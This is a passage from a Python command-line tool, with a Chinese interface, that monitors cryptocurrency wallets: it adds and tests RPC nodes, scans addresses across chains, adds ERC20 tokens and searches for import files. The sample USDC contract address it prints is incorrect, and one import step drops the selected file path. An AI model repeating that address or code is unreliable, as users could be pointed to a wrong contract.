                    for network_key, network_config in self.networks.items():
                        if network_key in saved_networks:
                            saved_chain_id = saved_networks[network_key].get('chain_id')
                            current_chain_id = network_config.get('chain_id')
                            if saved_chain_id != current_chain_id:
                                memory_match = False
                                print(f"  ⚠️  {network_key}: 内存({current_chain_id}) ≠ 保存({saved_chain_id})")
                    
                    if memory_match:
                        print(f"  ✅ 内存配置与保存文件一致")
                    else:
                        print(f"  ⚠️  发现配置不一致，建议重启程序")
                        
                else:
                    print(f"  ⚠️  状态文件中未找到网络配置")
            else:
                print(f"  ❌ 状态文件不存在: {self.state_file}")
            
            print(f"\n{Fore.GREEN}🎉 配置验证完成！修改将在下次初始化时生效{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"  {Fore.RED}❌ 验证失败: {e}{Style.RESET_ALL}")
    
    def _smart_add_rpc_nodes(self, network_key: str, network_name: str) -> int:
        """智能添加RPC节点 - 支持多种格式解析"""
        print(f"\n{Back.CYAN}{Fore.WHITE} 🌐 智能RPC节点添加 🌐 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}为网络 '{network_name}' 添加RPC节点{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}📋 支持的输入格式：{Style.RESET_ALL}")
        print(f"  1. 单个URL: https://rpc.example.com")
        print(f"  2. 多个URL (每行一个)")
        print(f"  3. 表格数据 (自动提取URL)")
        print(f"  4. JSON格式")
        print(f"  5. 混合格式 (智能识别)")
        
        print(f"\n{Fore.CYAN}💡 请粘贴RPC数据 (输入完成后按两次回车):{Style.RESET_ALL}")
        
        # 收集用户输入
        rpc_input = []
        empty_line_count = 0
        
        while True:
            line = self.safe_input("")
            if not line.strip():
                empty_line_count += 1
                if empty_line_count >= 2:
                    break
            else:
                empty_line_count = 0
                rpc_input.append(line)
        
        if not rpc_input:
            print(f"{Fore.YELLOW}💡 没有输入任何数据{Style.RESET_ALL}")
            return 0
        
        # 合并所有输入
        raw_data = '\n'.join(rpc_input)
        print(f"\n{Fore.CYAN}🔍 正在智能解析RPC数据...{Style.RESET_ALL}")
        
        # 智能解析RPC URL
        extracted_rpcs = self._extract_rpc_urls(raw_data)
        
        if not extracted_rpcs:
            print(f"{Fore.RED}❌ 未能识别到有效的RPC URL{Style.RESET_ALL}")
            return 0
        
        # 显示识别到的RPC
        print(f"\n{Fore.GREEN}✅ 智能识别到 {len(extracted_rpcs)} 个RPC URL:{Style.RESET_ALL}")
        for i, rpc in enumerate(extracted_rpcs[:10], 1):  # 只显示前10个
            print(f"  {i}. {rpc}")
        
        if len(extracted_rpcs) > 10:
            print(f"     ... 还有 {len(extracted_rpcs) - 10} 个RPC")
        
        # 询问是否添加
        confirm = self.safe_input(f"\n{Fore.YELLOW}➜ 是否添加这些RPC节点？(Y/n): {Style.RESET_ALL}").strip().lower()
        if confirm in ['n', 'no']:
            print(f"{Fore.YELLOW}💡 已取消添加{Style.RESET_ALL}")
            return 0
        
        # 批量测试和添加RPC
        return self._batch_test_and_add_rpcs(network_key, extracted_rpcs)
    
    def _extract_rpc_urls(self, raw_data: str) -> list:
        """从原始数据中智能提取RPC URL"""
        import re
        
        urls = []
        
        # RPC URL 正则模式 (支持http/https/ws/wss)
        url_patterns = [
            r'https?://[^\s\n\r\t]+',  # HTTP/HTTPS URLs
            r'wss?://[^\s\n\r\t]+',   # WebSocket URLs
        ]
        
        # 合并所有模式
        combined_pattern = '|'.join(f'({pattern})' for pattern in url_patterns)
        
        # 查找所有匹配的URL
        matches = re.findall(combined_pattern, raw_data, re.IGNORECASE)
        
        for match in matches:
            # match是一个元组，找到非空的分组
            for group in match:
                if group:
                    # 清理URL (移除可能的末尾字符)
                    clean_url = re.sub(r'[,;)\]\}"\'\s]*$', '', group)
                    
                    # 验证URL格式
                    if self._is_valid_rpc_url(clean_url):
                        urls.append(clean_url)
                    break
        
        # 去重并保持顺序
        seen = set()
        unique_urls = []
        for url in urls:
            if url not in seen:
                seen.add(url)
                unique_urls.append(url)
        
        # 按URL类型排序：WebSocket优先，然后是HTTPS，最后是HTTP
        def url_priority(url):
            if url.startswith('wss://'):
                return 0
            elif url.startswith('ws://'):
                return 1
            elif url.startswith('https://'):
                return 2
            elif url.startswith('http://'):
                return 3
            else:
                return 4
        
        unique_urls.sort(key=url_priority)
        
        return unique_urls
    
    def _is_valid_rpc_url(self, url: str) -> bool:
        """验证RPC URL的有效性"""
        import re
        
        # 基本URL格式检查
        url_pattern = r'^(https?|wss?)://[a-zA-Z0-9\-._~:/?#[\]@!$&\'()*+,;=%]+$'
        if not re.match(url_pattern, url):
            return False
        
        # 过滤明显不是RPC的URL
        exclude_patterns = [
            r'\.jpg$', r'\.png$', r'\.gif$', r'\.css$', r'\.js$',  # 静态文件
            r'\.pdf$', r'\.doc$', r'\.zip$',  # 文档文件
            r'twitter\.com', r'facebook\.com', r'github\.com',  # 社交媒体
            r'blog\.|news\.|forum\.',  # 博客/新闻站点
        ]
        
        for pattern in exclude_patterns:
            if re.search(pattern, url, re.IGNORECASE):
                return False
        
        # 检查长度
        if len(url) < 10 or len(url) > 200:
            return False
        
        return True
    
    def _batch_test_and_add_rpcs(self, network_key: str, rpc_urls: list) -> int:
        """批量测试和添加RPC节点"""
        print(f"\n{Back.BLUE}{Fore.WHITE} 🧪 批量测试RPC节点 🧪 {Style.RESET_ALL}")
        
        added_count = 0
        valid_rpcs = []
        
        # 并发测试RPC
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_url = {
                executor.submit(self._test_single_rpc, network_key, url): url 
                for url in rpc_urls
            }
            
            completed_count = 0
            for future in as_completed(future_to_url, timeout=60):
                url = future_to_url[future]
                completed_count += 1
                
                try:
                    result = future.result(timeout=15)
                    if result['success']:
                        valid_rpcs.append({
                            'url': url,
                            'response_time': result['response_time'],
                            'chain_id': result.get('chain_id')
                        })
                        status = f"{Fore.GREEN}✅ 有效 ({result['response_time']:.2f}s){Style.RESET_ALL}"
                    else:
                        status = f"{Fore.RED}❌ 无效 ({result['error'][:30]}){Style.RESET_ALL}"
                    
                    progress = f"[{completed_count:2d}/{len(rpc_urls)}]"
                    url_display = f"{url[:50]}..." if len(url) > 50 else url
                    print(f"  {Fore.CYAN}{progress}{Style.RESET_ALL} {url_display:<55} {status}")
                    
                except Exception as e:
                    progress = f"[{completed_count:2d}/{len(rpc_urls)}]"
                    url_display = f"{url[:50]}..." if len(url) > 50 else url
                    print(f"  {Fore.CYAN}{progress}{Style.RESET_ALL} {url_display:<55} {Fore.RED}❌ 测试异常{Style.RESET_ALL}")
        
        # 按响应时间排序
        valid_rpcs.sort(key=lambda x: x['response_time'])
        
        if valid_rpcs:
            print(f"\n{Fore.GREEN}✅ 找到 {len(valid_rpcs)} 个有效的RPC节点{Style.RESET_ALL}")
            
            # 显示最快的几个
            print(f"{Fore.CYAN}🚀 最快的RPC节点：{Style.RESET_ALL}")
            for i, rpc in enumerate(valid_rpcs[:5], 1):
                print(f"  {i}. {rpc['url']} ({rpc['response_time']:.2f}s)")
            
            # 添加到网络配置 - 统一使用rpc_urls字段
            network_config = self.networks[network_key]
            if 'rpc_urls' not in network_config:
                network_config['rpc_urls'] = []
            
            # 添加新的RPC (避免重复)
            existing_rpcs = set(network_config['rpc_urls'])
            for rpc in valid_rpcs:
                if rpc['url'] not in existing_rpcs:
                    network_config['rpc_urls'].append(rpc['url'])
                    added_count += 1
            
            if added_count > 0:
                print(f"{Fore.GREEN}✅ 已添加 {added_count} 个新的RPC节点到网络配置{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}💡 所有有效RPC已存在于配置中{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}❌ 没有找到有效的RPC节点{Style.RESET_ALL}")
        
        return added_count
    
    def _test_single_rpc(self, network_key: str, rpc_url: str) -> dict:
        """测试单个RPC节点"""
        start_time = time.time()
        
        try:
            # 基本连接测试
            w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 10}))
            
            if not w3.is_connected():
                return {
                    'success': False,
                    'error': '连接失败',
                    'response_time': time.time() - start_time
                }
            
            # 获取链ID验证
            chain_id = w3.eth.chain_id
            expected_chain_id = self.networks[network_key].get('chain_id')
            
            response_time = time.time() - start_time
            
            if expected_chain_id and chain_id != expected_chain_id:
                return {
                    'success': False,
                    'error': f'Chain ID不匹配: {chain_id} != {expected_chain_id}',
                    'response_time': response_time,
                    'chain_id': chain_id
                }
            
            # 尝试获取最新区块
            try:
                latest_block = w3.eth.block_number
                if latest_block <= 0:
                    return {
                        'success': False,
                        'error': '无法获取区块高度',
                        'response_time': response_time
                    }
            except:
                return {
                    'success': False,
                    'error': '区块查询失败',
                    'response_time': response_time
                }
            
            return {
                'success': True,
                'response_time': response_time,
                'chain_id': chain_id,
                'block_height': latest_block
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'response_time': time.time() - start_time
            }

    def establish_single_connection(self, network_key: str, rpc_url: str) -> bool:
        """建立单个网络的连接 - 使用新的连接管理系统"""
        try:
            network_info = self.networks[network_key]
            w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 10}))
            
            if w3.is_connected():
                # 验证链ID
                chain_id = w3.eth.chain_id
                if chain_id == network_info['chain_id']:
                    # 使用新的连接管理系统
                    self.update_connection_status(network_key, True, rpc_url, w3)
                    
                    # 保持向后兼容性
                    if not hasattr(self, 'web3_connections'):
                        self.web3_connections = {}
                    self.web3_connections[network_key] = w3
                    
                    return True
                else:
                    # Chain ID不匹配
                    self.update_connection_status(network_key, False, rpc_url)
                    return False
            else:
                # 连接失败
                self.update_connection_status(network_key, False, rpc_url)
                return False
        except Exception as e:
            # 连接异常
            self.update_connection_status(network_key, False, rpc_url)
            return False
    
    def scan_addresses_with_detailed_display(self):
        """扫描地址并显示详细过程 - 专为初始化后调用设计"""
        if not self.wallets:
            print(f"{Fore.RED}❌ 没有钱包地址可扫描{Style.RESET_ALL}")
            return
        
        print(f"\n{Back.MAGENTA}{Fore.WHITE} 🔍 开始详细扫描所有钱包地址 🔍 {Style.RESET_ALL}")
        
        addresses_to_scan = list(self.wallets.keys())
        total_addresses = len(addresses_to_scan)
        start_time = time.time()
        
        for i, address in enumerate(addresses_to_scan, 1):
            print(f"\n{Back.BLUE}{Fore.WHITE} 🔍 扫描地址 ({i}/{total_addresses}) {Style.RESET_ALL} {Fore.CYAN}{address}{Style.RESET_ALL}")
            
            # 使用并发扫描每个地址的所有网络
            address_networks = []
            blocked_networks = []
            
            # 获取已连接的网络列表
            connected_networks = list(self.web3_connections.keys())
            total_networks = len(connected_networks)
            
            if not connected_networks:
                print(f"  {Fore.RED}❌ 没有可用的网络连接{Style.RESET_ALL}")
                continue
            
            print(f"  {Fore.CYAN}📊 将检查 {total_networks} 个已连接的网络{Style.RESET_ALL}")
            
            # 分批并发检查
            batch_size = 5
            network_count = 0
            found_networks = 0
            
            for batch_start in range(0, len(connected_networks), batch_size):
                batch_end = min(batch_start + batch_size, len(connected_networks))
                batch_networks = connected_networks[batch_start:batch_end]
                
                print(f"  {Back.BLUE}{Fore.WHITE} 🚀 并发检查批次 {batch_start//batch_size + 1} ({len(batch_networks)} 个网络) {Style.RESET_ALL}")
                
                # 并发检查这一批网络
                # 使用20线程高性能扫描
                optimal_workers = 20
                optimal_workers = min(optimal_workers, len(batch_networks))
                
                with ThreadPoolExecutor(max_workers=optimal_workers) as executor:
                    future_to_network = {
                        executor.submit(self.check_transaction_history_concurrent, address, nk, 1.0): nk 
                        for nk in batch_networks
                    }
                    
                    # 收集结果
                    batch_results = {}
                    try:
                        for future in as_completed(future_to_network, timeout=2.0):
                            try:
                                network_key, has_history, elapsed, status = future.result(timeout=1.5)
                                batch_results[network_key] = (has_history, elapsed, status)
                            except Exception as e:
                                network_key = future_to_network[future]
                                batch_results[network_key] = (False, 1.0, f"异常: {str(e)[:20]}")
                    except concurrent.futures.TimeoutError:
                        # 处理未完成的futures
                        for future, network_key in future_to_network.items():
                            if not future.done():
                                future.cancel()
                                if network_key not in batch_results:
                                    batch_results[network_key] = (False, 1.0, "快速扫描超时")
                    
                    # 显示这一批的结果
                    for nk in batch_networks:
                        network_count += 1
                        network_name = self.networks[nk]['name']
                        
                        if nk in batch_results:
                            has_history, elapsed, status = batch_results[nk]
                            
                            if has_history:
                                address_networks.append(nk)
                                found_networks += 1
                                result_color = Fore.GREEN
                                result_icon = "✅"
                                result_text = f"有交易 ({status})"
                            else:
                                blocked_networks.append(nk)
                                result_color = Fore.RED
                                result_icon = "❌"
                                result_text = f"无交易 ({status})"
                        else:
                            # 超时的网络
                            blocked_networks.append(nk)
                            result_color = Fore.YELLOW
                            result_icon = "⏱️"
                            result_text = "超时"
                        
                        print(f"    {Fore.CYAN}🌐 [{network_count:2d}/{total_networks}] {network_name:<35}{Style.RESET_ALL} {result_color}{result_icon} {result_text}{Style.RESET_ALL}")
            
            # 保存扫描结果
            if address_networks:
                self.monitored_addresses[address] = {
                    'networks': address_networks,
                    'last_check': time.time()
                }
                print(f"  {Fore.GREEN}🎯 该地址将被监控，发现 {len(address_networks)} 个网络有交易历史{Style.RESET_ALL}")
            else:
                print(f"  {Fore.YELLOW}⚠️ 该地址将被跳过（无交易历史）{Style.RESET_ALL}")
            
            if blocked_networks:
                self.blocked_networks[address] = blocked_networks
            
            # 更新扫描完成状态
            self.address_full_scan_done[address] = True
        
        # 扫描完成总结
        elapsed = time.time() - start_time
        print(f"\n{Back.GREEN}{Fore.BLACK} ✨ 第一轮扫描完成 ✨ {Style.RESET_ALL}")
        print(f"✅ 监控地址: {Fore.GREEN}{len(self.monitored_addresses)}{Style.RESET_ALL} 个")
        print(f"❌ 屏蔽网络: {Fore.RED}{sum(len(nets) for nets in self.blocked_networks.values())}{Style.RESET_ALL} 个")
        print(f"⏱️ 用时: {Fore.CYAN}{elapsed:.2f}s{Style.RESET_ALL}")
        
        # 重试失败的网络
        self._retry_failed_scans(list(self.wallets.keys()))
        
        # 更新全量扫描完成时间
        self.last_full_scan_time = time.time()
        
        # 保存状态
        self.save_state()
        
        # 询问是否立即开始监控
        if self.monitored_addresses and self.target_wallet:
            print(f"\n{Back.GREEN}{Fore.WHITE} 🎉 扫描完成！可以开始监控了 🎉 {Style.RESET_ALL}")
            print(f"{Fore.GREEN}✅ 监控地址: {len(self.monitored_addresses)} 个{Style.RESET_ALL}")
            print(f"{Fore.GREEN}✅ 目标账户: {self.target_wallet[:10]}...{self.target_wallet[-8:]}{Style.RESET_ALL}")
            print(f"\n{Back.CYAN}{Fore.WHITE} 🚀 准备开始监控 🚀 {Style.RESET_ALL}")
            print(f"{Fore.CYAN}双击回车开始监控，或输入其他内容取消{Style.RESET_ALL}")
            
            # 等待双击回车
            user_input = self.wait_for_double_enter()
            
            if user_input == "":  # 双击回车
                print(f"\n{Back.CYAN}{Fore.WHITE} 🚀 正在启动监控系统... 🚀 {Style.RESET_ALL}")
                if self.start_monitoring():
                    print(f"\n{Fore.GREEN}🎉 监控已成功启动！系统将持续运行...{Style.RESET_ALL}")
                    # 保持监控运行，直到用户按Ctrl+C
                    try:
                        while self.monitoring:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print(f"\n{Fore.YELLOW}👋 用户停止监控{Style.RESET_ALL}")
                        self.stop_monitoring()
                    return True
                else:
                    print(f"\n{Fore.RED}❌ 监控启动失败{Style.RESET_ALL}")
                    return False
            elif user_input in ["cancelled", "error"]:
                print(f"\n{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
                return False
            else:
                print(f"\n{Fore.YELLOW}⚠️ 监控已取消，可通过主菜单随时开始{Style.RESET_ALL}")
                return False
        elif not self.target_wallet:
            print(f"\n{Fore.YELLOW}💡 提示：请先设置目标账户，然后就可以开始监控了{Style.RESET_ALL}")
            return False
        else:
            print(f"\n{Fore.YELLOW}⚠️ 没有可监控的地址，请先添加钱包或重新扫描{Style.RESET_ALL}")
            return False
    

    
    def wait_for_double_enter(self) -> str:
        """等待用户双击回车，返回输入内容（空字符串表示双击回车）"""
        try:
            first_input = self.safe_input()
            if first_input == "":
                # 第一次是回车，等待第二次
                print(f"{Fore.YELLOW}再按一次回车确认开始监控...{Style.RESET_ALL}")
                second_input = self.safe_input()
                if second_input == "":
                    return ""  # 双击回车
                else:
                    return second_input  # 第二次输入了内容
            else:
                return first_input  # 第一次就输入了内容
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}👋 操作已取消{Style.RESET_ALL}")
            return "cancelled"
        except Exception:
            return "error"

    def menu_add_custom_token(self):
        """菜单：添加自定义代币"""
        print(f"\n{Fore.CYAN}✨ ====== 🪙 添加自定义代币 🪙 ====== ✨{Style.RESET_ALL}")
        print(f"{Back.GREEN}{Fore.BLACK} 🌐 检测并添加ERC20代币到监控列表 {Style.RESET_ALL}")
        
        # 步骤1: 选择网络
        print(f"\n{Fore.YELLOW}📋 步骤1: 选择网络{Style.RESET_ALL}")
        print(f"{Fore.CYAN}可用网络列表：{Style.RESET_ALL}")
        
        network_list = list(self.networks.items())
        for i, (network_key, network_info) in enumerate(network_list):
            print(f"  {Fore.GREEN}{i+1:2d}.{Style.RESET_ALL} {network_info['name']}")
        
        print(f"\n{Fore.YELLOW}💡 提示：输入网络编号或网络名称{Style.RESET_ALL}")
        network_input = self.safe_input(f"\n{Fore.CYAN}➜ 请选择网络: {Style.RESET_ALL}").strip()
        
        if not network_input:
            print(f"\n{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
            self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回...{Style.RESET_ALL}")
            return
        
        # 解析网络选择
        selected_network = None
        try:
            # 尝试解析为数字
            network_index = int(network_input) - 1
            if 0 <= network_index < len(network_list):
                selected_network = network_list[network_index][0]
        except ValueError:
            # 按名称搜索
            for network_key, network_info in self.networks.items():
                if network_input.lower() in network_info['name'].lower() or network_input.lower() == network_key.lower():
                    selected_network = network_key
                    break
        
        if not selected_network:
            print(f"\n{Fore.RED}❌ 未找到匹配的网络: {network_input}{Style.RESET_ALL}")
            self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回...{Style.RESET_ALL}")
            return
        
        network_info = self.networks[selected_network]
        print(f"\n{Fore.GREEN}✅ 已选择网络: {network_info['name']}{Style.RESET_ALL}")
        
        # 步骤2: 输入代币地址
        print(f"\n{Fore.YELLOW}📋 步骤2: 输入代币合约地址{Style.RESET_ALL}")
        print(f"{Fore.GREEN}示例：{Style.RESET_ALL}")
        print(f"  • USDC: 0xA0b86a33E6417aFD5BF27c23E2a7B0b9bE6C1e67")
        print(f"  • USDT: 0xdAC17F958D2ee523a2206206994597C13D831ec7") 
        
        token_address = self.safe_input(f"\n{Fore.CYAN}➜ 代币合约地址: {Style.RESET_ALL}").strip()
        
        if not token_address:
            print(f"\n{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
            self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回...{Style.RESET_ALL}")
            return
        
        # 步骤3: 检测代币信息
        print(f"\n{Fore.CYAN}🔄 正在检测代币信息...{Style.RESET_ALL}")
        token_info = self.get_token_info(token_address, selected_network)
        
        if not token_info:
            print(f"\n{Fore.RED}❌ 无法获取代币信息{Style.RESET_ALL}")
            print(f"   可能原因：")
            print(f"   • 地址格式错误")
            print(f"   • 不是有效的ERC20代币合约")
            print(f"   • 网络连接问题")
            self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回...{Style.RESET_ALL}")
            return
        
        # 步骤4: 显示代币信息并确认
        print(f"\n{Fore.GREEN}🎉 成功检测到代币信息！{Style.RESET_ALL}")
        print(f"\n{Back.BLUE}{Fore.WHITE} 📋 代币详细信息 📋 {Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}代币名称:{Style.RESET_ALL} {token_info['name']}")
        print(f"  {Fore.YELLOW}代币符号:{Style.RESET_ALL} {token_info['symbol']}")
        print(f"  {Fore.YELLOW}小数位数:{Style.RESET_ALL} {token_info['decimals']}")
        print(f"  {Fore.YELLOW}合约地址:{Style.RESET_ALL} {token_info['address']}")
        print(f"  {Fore.YELLOW}所在网络:{Style.RESET_ALL} {network_info['name']}")
        
        # 确认添加
        print(f"\n{Fore.YELLOW}❓ 确认添加此代币到监控列表？{Style.RESET_ALL}")
        confirm = self.safe_input(f"{Fore.CYAN}➜ 输入 'y' 确认添加，其他键取消: {Style.RESET_ALL}").strip().lower()
        
        if confirm == 'y':
            # 添加代币
            if self.add_custom_token(token_info):
                print(f"\n{Fore.GREEN}🎉 代币添加成功！{Style.RESET_ALL}")
                print(f"   现在可以监控 {token_info['symbol']} 在 {network_info['name']} 上的余额了")
                
                # 显示当前支持的代币总数
                print(f"\n{Fore.CYAN}📊 当前支持的代币数量: {len(self.tokens)} 个{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.RED}❌ 代币添加失败{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
        
        self.safe_input(f"\n{Fore.MAGENTA}🔙 按回车键返回主菜单...{Style.RESET_ALL}")
    
    def add_custom_rpc(self, network_key: str, rpc_url: str, quick_test: bool = False) -> bool:
        """添加自定义RPC到指定网络，支持HTTP(S)和WebSocket，自动去重"""
        try:
            if network_key not in self.networks:
                print(f"{Fore.RED}❌ 网络不存在: {network_key}{Style.RESET_ALL}")
                return False
            
            # 标准化URL格式
            rpc_url = rpc_url.strip()
            
            # 自动去重：检查URL是否已存在
            existing_urls = self.networks[network_key]['rpc_urls']
            if rpc_url in existing_urls:
                if not quick_test:  # 只在非快速测试时显示消息
                    print(f"{Fore.YELLOW}⚠️ RPC已存在，跳过添加: {rpc_url[:50]}...{Style.RESET_ALL}")
                return True
            
            # 验证URL格式，支持HTTP(S)和WebSocket
            if not rpc_url.startswith(('http://', 'https://', 'ws://', 'wss://')):
                if not quick_test:
                    print(f"{Fore.RED}❌ 无效的RPC URL格式，支持: http(s)://、ws(s)://{Style.RESET_ALL}")
                return False
            
            # 测试RPC连接
            network_info = self.networks[network_key]
            if not quick_test:
                print(f"{Fore.CYAN}🔄 正在测试RPC连接...{Style.RESET_ALL}")
            
            # 根据是否快速测试选择超时时间
            timeout = 3 if quick_test else 10
            
            if self.test_rpc_connection(rpc_url, network_info['chain_id'], timeout=timeout, quick_test=quick_test):
                # 添加到RPC列表的开头（优先使用）
                self.networks[network_key]['rpc_urls'].insert(0, rpc_url)
                print(f"{Fore.GREEN}✅ RPC已添加到网络 {network_info['name']}{Style.RESET_ALL}")
                
                # 尝试重新连接该网络
                try:
                    from web3 import Web3
                    # 根据URL类型选择提供者
                    if rpc_url.startswith(('ws://', 'wss://')):
                        provider = Web3.WebsocketProvider(rpc_url, websocket_kwargs={'timeout': 10})
                    else:
                        provider = Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 10})
                    
                    w3 = Web3(provider)
                    if w3.is_connected():
                        self.web3_connections[network_key] = w3
                        print(f"{Fore.GREEN}✅ 网络连接成功，已设为该网络的主要连接{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.YELLOW}⚠️ RPC已添加但网络连接失败: {e}{Style.RESET_ALL}")
                
                # 保存配置
                self.logger.info(f"已添加自定义RPC: {network_key} -> {rpc_url}")
                
                # 更新RPC缓存
                if network_key in self.rpc_test_cache:
                    self.rpc_test_cache[network_key]['results'][rpc_url] = True
                    # 更新缓存时间
                    self.rpc_test_cache[network_key]['last_test'] = time.time()
                
                return True
            else:
                print(f"{Fore.RED}❌ RPC连接测试失败，请检查URL是否正确{Style.RESET_ALL}")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}❌ 添加RPC失败: {e}{Style.RESET_ALL}")
            self.logger.error(f"添加自定义RPC失败: {network_key} -> {rpc_url}: {e}")
            return False
    
    def get_cached_rpc_results(self, network_key: str = None, force_refresh: bool = False) -> Dict:
        """获取缓存的RPC检测结果，避免重复检测"""
        current_time = time.time()
        
        if force_refresh:
            # 强制刷新，清除缓存
            if network_key:
                self.rpc_test_cache.pop(network_key, None)
            else:
                self.rpc_test_cache.clear()
        
        results = {}
        networks_to_test = [network_key] if network_key else self.networks.keys()
        
        for net_key in networks_to_test:
            if net_key not in self.networks:
                continue
                
            network_info = self.networks[net_key]
            
            # 检查缓存是否有效
            cache_entry = self.rpc_test_cache.get(net_key)
            cache_valid = (cache_entry and 
                          current_time - cache_entry['last_test'] < self.rpc_cache_ttl)
            
            if cache_valid and not force_refresh:
                # 使用缓存数据
                cached_results = cache_entry['results']
                working_rpcs = [url for url, status in cached_results.items() if status]
                failed_rpcs = [url for url, status in cached_results.items() if not status]
                last_test_time = cache_entry['last_test']
                time_ago = int(current_time - last_test_time)
                print(f"{Fore.GREEN}📋 使用缓存数据: {network_info['name']} ({len(working_rpcs)}/{len(cached_results)} 可用) - {time_ago}秒前检测{Style.RESET_ALL}")
            else:
                # 需要重新测试
                print(f"{Fore.CYAN}🔄 检测网络 {network_info['name']} 的RPC状态...{Style.RESET_ALL}")
                
                working_rpcs = []
                failed_rpcs = []
                test_results = {}
                
                for rpc_url in network_info['rpc_urls']:
                    if rpc_url in self.blocked_rpcs:
                        failed_rpcs.append(rpc_url)
                        test_results[rpc_url] = False
                    else:
                        is_working = self.test_rpc_connection(rpc_url, network_info['chain_id'], timeout=3)
                        if is_working:
                            working_rpcs.append(rpc_url)
                        else:
                            failed_rpcs.append(rpc_url)
                        test_results[rpc_url] = is_working
                
                # 更新缓存
                self.rpc_test_cache[net_key] = {
                    'last_test': current_time,
                    'results': test_results
                }
            
            # 计算统计信息
            total_count = len(working_rpcs) + len(failed_rpcs)
            success_rate = (len(working_rpcs) / total_count * 100) if total_count > 0 else 0
            
            results[net_key] = {
                'name': network_info['name'],
                'working_rpcs': working_rpcs,
                'failed_rpcs': failed_rpcs,
                'success_rate': success_rate,
                'available_count': len(working_rpcs),
                'total_count': total_count,
                'chain_id': network_info['chain_id'],
                'currency': network_info['native_currency']
            }
        
        return results
    
    def import_rpcs_from_chainlist(self):
        """从ChainList数据批量导入RPC"""
        print(f"\n{Back.GREEN}{Fore.BLACK} 🌐 ChainList RPC批量导入 🌐 {Style.RESET_ALL}")
        print(f"{Fore.CYAN}从ChainList数据自动识别并导入RPC节点{Style.RESET_ALL}")
        
        # 1. 文件选择
        print(f"\n{Fore.YELLOW}📁 步骤1: 选择数据文件{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 输入自定义文件路径")
        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} 从当前目录选择文件")
        
        file_choice = self.safe_input(f"\n{Fore.CYAN}➜ 请选择方式 (1-2): {Style.RESET_ALL}").strip()
        
        file_path = None
        if file_choice == '1':
            # 自定义文件名（智能搜索）
            default_filename = "1.txt"
            filename = self.safe_input(f"\n{Fore.CYAN}➜ 请输入文件名 [默认: {default_filename}]: {Style.RESET_ALL}").strip()
            if not filename:
                filename = default_filename
            
            # 智能搜索文件
            file_path = self._smart_find_file(filename)
        elif file_choice == '2':
            # 列出当前目录文件
            file_path = self._select_file_from_directory()
        else:
            print(f"\n{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
            return
        
        if not file_path:
            print(f"\n{Fore.YELLOW}⚠️ 未选择文件，操作取消{Style.RESET_ALL}")
            return
        
        # 2. 读取和解析文件
        chainlist_data = self._read_chainlist_file()
        if not chainlist_data:
            return
        
        # 3. 匹配和导入RPC
        self._process_chainlist_data(chainlist_data)
    
    def _smart_find_file(self, filename: str) -> str:
        """智能搜索文件，支持多个可能的路径"""
        import os
        import glob
        
        print(f"\n{Fore.CYAN}🔍 智能搜索文件: {filename}{Style.RESET_ALL}")
        
        # 搜索路径列表（按优先级排序）
        search_paths = [
            # 1. 当前工作目录
            os.getcwd(),
            # 2. 脚本所在目录
            os.path.dirname(os.path.abspath(__file__)),
            # 3. 用户主目录
            os.path.expanduser("~"),
            # 4. 桌面目录
            os.path.expanduser("~/Desktop"),
            # 5. 下载目录
            os.path.expanduser("~/Downloads"),
            # 6. 文档目录
            os.path.expanduser("~/Documents"),
            # 7. 根目录（服务器场景）
            "/",
            # 8. /tmp目录
            "/tmp",
            # 9. /home/用户名 目录
            f"/home/{os.getenv('USER', 'root')}",
        ]
        
        found_files = []
        
        # 在每个路径中搜索
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
                
            try:
                # 精确匹配
                exact_path = os.path.join(search_path, filename)
                if os.path.isfile(exact_path):
                    file_size = os.path.getsize(exact_path) // 1024  # KB
                    found_files.append({
                        'path': exact_path,
                        'size': file_size,
                        'location': search_path,
                        'match_type': 'exact'
                    })
                    print(f"  ✅ 找到精确匹配: {exact_path} ({file_size} KB)")
                
                # 模糊匹配（无扩展名的情况）
                if '.' not in filename:
                    for ext in ['.txt', '.json', '.data', '.log']:
                        fuzzy_path = os.path.join(search_path, filename + ext)
                        if os.path.isfile(fuzzy_path):
                            file_size = os.path.getsize(fuzzy_path) // 1024
                            found_files.append({
                                'path': fuzzy_path,
                                'size': file_size,
                                'location': search_path,
                                'match_type': 'fuzzy'
                            })
                            print(f"  🔍 找到模糊匹配: {fuzzy_path} ({file_size} KB)")
                
                # 通配符搜索
                pattern = os.path.join(search_path, f"*{filename}*")
                for wild_path in glob.glob(pattern):
                    if os.path.isfile(wild_path) and wild_path not in [f['path'] for f in found_files]:
                        file_size = os.path.getsize(wild_path) // 1024
                        found_files.append({
                            'path': wild_path,
                            'size': file_size,
                            'location': search_path,
                            'match_type': 'wildcard'
                        })
                        print(f"  🌟 找到通配符匹配: {wild_path} ({file_size} KB)")
                        
            except (PermissionError, OSError):
                # 跳过无权限访问的目录
                continue
        
        if not found_files:
